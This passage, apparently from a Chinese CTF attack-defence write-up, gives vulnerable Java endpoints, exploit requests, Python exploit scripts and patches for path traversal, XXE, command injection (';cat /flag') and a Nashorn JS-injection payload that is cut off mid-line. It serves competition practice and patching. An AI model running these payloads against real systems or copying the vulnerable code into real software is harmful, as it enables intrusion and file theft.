class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url + <span class="string">&#x27;util/image?filepath=/flag&#x27;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        flag = <span class="built_in">bytes</span>.decode(base64.b64decode(response.text))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, flag):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, flag)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag1(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 60):</span></span><br><span class="line">    <span class="comment">#         # url ä¸ºé¶æœºip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/image&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;File doesn&#x27;t exist or is not a file.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="æºç -2"><a href="#æºç -2" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/doc&quot;, method = RequestMethod.POST)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">DocParseX</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">           <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="literal">true</span>);</span><br><span class="line">           dbf.setNamespaceAware(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">           <span class="type">StringReader</span> <span class="variable">sr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(body);</span><br><span class="line">           <span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(sr);</span><br><span class="line">           <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> db.parse(is);</span><br><span class="line"></span><br><span class="line">           <span class="type">NodeList</span> <span class="variable">rootNodeList</span> <span class="operator">=</span> document.getChildNodes();</span><br><span class="line">           response(rootNodeList);</span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> nodeListToString(rootNodeList);</span><br><span class="line">           <span class="keyword">return</span> result;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           logger.error(e.toString());</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-2"><a href="#æ¼æ´åˆ©ç”¨-2" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;util&#x2F;doc XXE</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /util/doc</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">node</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;util/doc&#x27;</span></span><br><span class="line">    <span class="comment"># python3å­—ç¬¦ä¸²æ¢è¡Œï¼Œåœ¨å³è¾¹åŠ ä¸ªåæ–œæ \ï¼ŒåŒå¼•å·è½¬ä¹‰å¯ä»¥ç”¨&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;!DOCTYPE node [&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;!ENTITY goodies SYSTEM \&quot;file:///flag\&quot;&gt; ]&gt;&quot;</span> \</span><br><span class="line">           <span class="string">&quot;&lt;node&gt;&amp;goodies;&lt;/node&gt;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.post(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url ä¸ºé¶æœºip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">value = &#123;&quot;/doc&quot;&#125;,</span></span><br><span class="line"><span class="meta">method = &#123;RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DocParseX</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="æºç -3"><a href="#æºç -3" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/listBucket&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">listDir</span><span class="params">(String filepath, Model model)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       String line;</span><br><span class="line">       java.lang.<span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;ls -t /tmp/&quot;</span>);</span><br><span class="line">       java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">       java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">       String[] cmdList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls &quot;</span> + filepath&#125;;</span><br><span class="line">       <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdList);</span><br><span class="line">       builder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();</span><br><span class="line">       <span class="keyword">if</span> (filepath!=<span class="literal">null</span>) &#123;</span><br><span class="line">           List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;File&gt;();</span><br><span class="line">           <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line"></span><br><span class="line">           String[] files = result.split(System.lineSeparator());</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">               <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(i, files[i]);</span><br><span class="line">               list.add(file);</span><br><span class="line">           &#125;</span><br><span class="line">           model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;File&gt;();</span><br><span class="line">           <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">while</span>( (line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">               <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(id, line);</span><br><span class="line">               list.add(file);</span><br><span class="line">               id ++;</span><br><span class="line">           &#125;</span><br><span class="line">           model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-3"><a href="#æ¼æ´åˆ©ç”¨-3" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;listBucket å‘½ä»¤æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /listBucket?filepath=;cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">count1 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url + <span class="string">&quot;listBucket?filepath=;cat%20/flag&quot;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 59):</span></span><br><span class="line">    <span class="comment">#         # url ä¸ºé¶æœºip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     print(&quot;[+]Get flag count &#123;&#125;&quot;.format(count1))</span></span><br><span class="line">    <span class="comment">#     count1 = 0</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-3"><a href="#patch-3" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/listBucket&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">listDir</span><span class="params">(String filepath, Model model)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ls -t /tmp/&quot;</span>);</span><br><span class="line">       <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> proc.getInputStream();</span><br><span class="line">       <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">       List&lt;File&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">       String line;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>; (line = br.readLine()) != <span class="literal">null</span>; ++id) &#123;</span><br><span class="line">           <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(id, line);</span><br><span class="line">           list.add(file);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;bucket&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><h3 id="æºç -4"><a href="#æºç -4" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check jsEngine status</span></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/jsEngine&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">       <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           Map&lt;String, String&gt; jsStatus = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">           jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is loading...&quot;</span>);</span><br><span class="line">           engine.eval(cmd, bindings);</span><br><span class="line">           <span class="keyword">return</span> jsStatus;</span><br><span class="line">       &#125; <span class="keyword">catch</span>(ScriptException e)&#123;</span><br><span class="line">           Map&lt;String, String&gt; jsStatus = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">           jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is ready&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span> jsStatus;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-4"><a href="#æ¼æ´åˆ©ç”¨-4" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;util&#x2F;jsEngine jsä»£ç æ³¨å…¥</p><p>å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/jsEngine?jsurl=nashorn:mozilla_compat.js%<span class="number">22</span>);%<span class="number">20</span>importPackage(java.lang);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>x=Runtime.<span class="title function_ invoke__">getRuntime</span>();%<span class="number">20</span>x.<span class="title function_ invoke__">exec</span>(%<span 